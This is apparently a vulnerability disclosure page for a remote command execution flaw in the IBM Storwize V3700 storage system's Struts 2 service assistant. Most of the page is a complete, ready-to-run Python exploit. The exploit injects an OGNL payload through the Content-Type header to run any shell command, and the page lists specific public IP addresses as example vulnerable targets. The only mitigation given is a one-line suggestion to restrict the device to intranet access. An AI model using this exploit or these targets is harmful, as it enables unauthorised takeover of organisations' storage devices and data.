## IBM-Storwize-V3700-RCE

### Essential information

- **Vulnerability vendor:** IBM Corporation  
- **Manufacturer's official website:** [https://www.ibm.com/](https://www.ibm.com/)  
- **Affected object type:** disk array / storage device system  
- **Product affected:** IBM storwize v3700 (other equipment to be tested)
- **Product version affected:** IBM storwize v3700 storage management (v3700. *)


### Vulnerability details

- **Vulnerability Name:** Command Execution Vulnerability exists in IBM storwize v3700 device system
- **Vulnerability Description:** IBM storwize v3700 is the latest member of the IBM storwize disk system family. It provides efficient entry-level configuration and is designed to meet the needs of small and medium-sized enterprises. Storwize v3700 is designed to provide organizations with the ability to integrate and share data at a reasonable price, while providing advanced software functions that are usually more expensive systems.The device system is equipped with a service assistant web application by default. The web application uses the struts 2 component, and there is an arbitrary command execution vulnerability, so that the attacker can easily obtain the management authority of the device.
- **exp:**
```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
# Usage: python3 exp.py <url> <cmd>

import requests
import http.client
http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
requests.packages.urllib3.disable_warnings()

def exploit(url, cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        page = requests.post(url, headers=headers, verify=False, stream=True).text
    except http.client.IncompleteRead as e:
        page = e.partial.decode('utf-8')

    print(page)
    return page


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 3:
        print("[*] exp.py <url> <cmd>")
    else:
        print('[*] Start!')
        url = sys.argv[1]
        cmd = sys.argv[2]
        print("[*] cmd: %s\n" % cmd)
        exploit(url, cmd)
```
![Attack succeeded image](https://user-images.githubusercontent.com/28224012/147313740-7dcd7e16-3f68-47e7-8c09-ecc6a120ea59.png)

- **Example vulnerability URL:** `https://160.99.1.218/service/` `https://211.170.78.84/service/` `https://148.216.53.36/service/` .etc
- **Temporary solution:** restrict the device to intranet access only, and add a white list to the firewall.
